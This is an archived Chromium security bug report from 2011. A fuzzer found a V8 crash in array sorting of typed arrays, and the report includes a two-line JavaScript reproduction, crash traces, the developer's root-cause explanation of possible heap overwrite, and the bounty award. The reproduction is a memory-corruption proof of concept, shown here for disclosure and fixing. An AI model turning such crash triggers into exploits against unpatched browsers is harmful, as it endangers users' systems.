# [LangFuzz] Crash at v8::Object::SlowGetPointerFromInternalField with invalid read

| Field | Value |
|-------|-------|
| **Issue ID** | [40095828](https://issues.chromium.org/issues/40095828) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Internals |
| **Reporter** | de...@googlemail.com |
| **Assignee** | ms...@chromium.org |
| **Created** | 2011-10-01 |
| **Bounty** | $1,000.00 |

## Description

**VULNERABILITY DETAILS**  

The JavaScript code below crashes Chromium 15/Chrome 16 at function "v8::Object::SlowGetPointerFromInternalField" and V8 shell (d8) at function "JSObject::PrepareElementsForSort", both with an invalid read.

The shell address is 0x4e454d44 which looks particularly dangerous (ASCII, most likely in some data). The address in Chromium 15 is 0x10000a313000005.

Note that you might need to refresh the testcase once or twice for the sad tab to show up.

**VERSION**  

Chrome Version: 15.0.865.0 (Developer Build 98568 Linux) beta  

Chrome Version: 16.0.891.0 dev  

Operating System: Ubuntu 11.04, tested on 64 bit

**REPRODUCTION CASE**  

var nonArray = { length: 0xb , 0: 42, 2: 37, "\xda" : undefined, 4: 0 };  

Array.prototype.sort.call(new Int16Array(345), this);

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab  

Crash State:

GDB Trace from Chromium 15:

Program received signal SIGSEGV, Segmentation fault.  

0x00007ffff5773c60 in v8::Object::SlowGetPointerFromInternalField(int) ()  

(gdb) bt  

#0 0x00007ffff5773c60 in v8::Object::SlowGetPointerFromInternalField(int) ()  

#1 0x00007ffff62ac8a6 in WebCore::IntrusiveDOMWrapperMap::removeIfPresent(WebCore::Node\*, v8::Persistent[v8::Object](javascript:void(0);)) ()  

#2 0x00007ffff62a80ea in WebCore::DOMDataStore::weakNodeCallback(v8::Persistent[v8::Value](javascript:void(0);), void\*) ()  

#3 0x00007ffff57ca252 in v8::internal::GlobalHandles::PostGarbageCollectionProcessing(v8::internal::GarbageCollector) ()  

#4 0x00007ffff57e7f9f in v8::internal::Heap::PerformGarbageCollection(v8::internal::GarbageCollector, v8::internal::GCTracer\*) ()  

#5 0x00007ffff57e8659 in v8::internal::Heap::CollectGarbage(v8::internal::AllocationSpace, v8::internal::GarbageCollector) ()  

#6 0x00007ffff57e8c21 in v8::internal::Heap::IdleNotification() ()  

#7 0x00007ffff5ef59e6 in WebCore::ThreadTimers::sharedTimerFiredInternal() ()  

#8 0x00007ffff53f7efe in base::subtle::TaskClosureAdapter::Run() ()  

#9 0x00007ffff53d3b83 in MessageLoop::RunTask(MessageLoop::PendingTask const&) ()  

#10 0x00007ffff53d40e8 in MessageLoop::DeferOrRunPendingTask(MessageLoop::PendingTask const&) ()  

#11 0x00007ffff53d449f in MessageLoop::DoDelayedWork(base::TimeTicks\*) ()  

#12 0x00007ffff53d8f8e in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) ()  

#13 0x00007ffff53d254c in MessageLoop::Run() ()  

#14 0x00007ffff6a118a7 in RendererMain(MainFunctionParams const&) ()  

#15 0x00007ffff4c59d39 in ChromeMain ()  

#16 0x00007ffff4c5a781 in main ()  

(gdb) x /4i $pc  

=> 0x7ffff5773c60 <\_ZN2v86Object31SlowGetPointerFromInternalFieldEi+96>: mov -0x1(%rax),%rdx  

0x7ffff5773c64 <\_ZN2v86Object31SlowGetPointerFromInternalFieldEi+100>: cmpb $0x85,0xb(%rdx)  

0x7ffff5773c68 <\_ZN2v86Object31SlowGetPointerFromInternalFieldEi+104>: jne 0x7ffff5773c5c <\_ZN2v86Object31SlowGetPointerFromInternalFieldEi+92>  

0x7ffff5773c6a <\_ZN2v86Object31SlowGetPointerFromInternalFieldEi+106>: mov 0x7(%rax),%rax  

(gdb) info register rax rdx  

rax 0x10000a313000005 72058294436364293  

rdx 0x1 1

Valgrind trace from V8 shell:

==19885== Invalid read of size 4  

==19885== at 0x820B878: v8::internal::JSObject::PrepareElementsForSort(unsigned int) (in /scratch/holler/LangFuzz/v8-trunk/d8)  

==19885== Address 0x4e454d44 is not stack'd, malloc'd or (recently) free'd  

==19885==  

==19885==  

==19885== Process terminating with default action of signal 11 (SIGSEGV)

Notify me if you need a Chrome 16 trace. I choose Chromium 15 because my system should have debug symbols for that. By the way, there is no Chromium 16 build for Ubuntu available it seems :( I downloaded the Chrome build from Google directly instead.

## Timeline

### sc...@gmail.com (2011-10-01)

cc:ing team v8 :D
As always, we'd love an analysis on the root cause, so we can assign severity / reward appropriately.

### [Deleted User] (2011-10-03)

[Empty comment from Monorail migration]

### da...@chromium.org (2011-10-04)

[Empty comment from Monorail migration]

### ms...@chromium.org (2011-10-12)

Fixed in v8 bleeding edge and also merged back to the 3.4 and 3.5 branch as version 3.4.14.30 and 3.5.10.16 respectively.

The function PrepareElementsForSort() mistreated an array containing external elements as one containing fast elements and hence accessed memory areas behind the array object. We had an assertion in place covering that assumption, but those are disabled in release builds. Carefully choosing array length and objects behind the array would have allowed to arbitrarily overwrite heap objects in that areas.

### in...@chromium.org (2011-10-12)

[Empty comment from Monorail migration]

### js...@chromium.org (2011-10-12)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-10-19)

@decoder.oh: thanks for continue to help us with v8 robustness! $1000

----
Boilerplate text:
Please do NOT publicly disclose details until a fix has been released to all our
users. Early public disclosure may cancel the provisional reward.
Also, please be considerate about disclosure when the bug affects a core library
that may be used by other products.
Please do NOT share this information with third parties who are not directly
involved in fixing the bug. Doing so may cancel the provisional reward.
Please be honest if you have already disclosed anything publicly or to third parties.
----

### sc...@gmail.com (2011-10-19)

[Empty comment from Monorail migration]

### [Deleted User] (2011-10-25)

[Empty comment from Monorail migration]

### sc...@gmail.com (2011-10-28)

Payment in system, can take up to a couple of weeks.

### [Deleted User] (2012-05-15)

Marking old security bugs Fixed..

### bu...@chromium.org (2012-10-13)

This issue has been closed for some time. No one will pay attention to new comments.
If you are seeing this bug or have new data, please click New Issue to start a new bug.

### bu...@chromium.org (2013-03-10)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-13)

[Empty comment from Monorail migration]

### sc...@gmail.com (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-03-21)

[Empty comment from Monorail migration]

### bu...@chromium.org (2013-04-01)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-06-14)

[Empty comment from Monorail migration]

### sh...@chromium.org (2016-10-01)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2016-10-02)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### mb...@chromium.org (2016-10-02)

[Empty comment from Monorail migration]

### aw...@chromium.org (2018-04-25)

[Empty comment from Monorail migration]

### is...@google.com (2018-04-25)

This issue was migrated from crbug.com/chromium/98773?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40095828)*
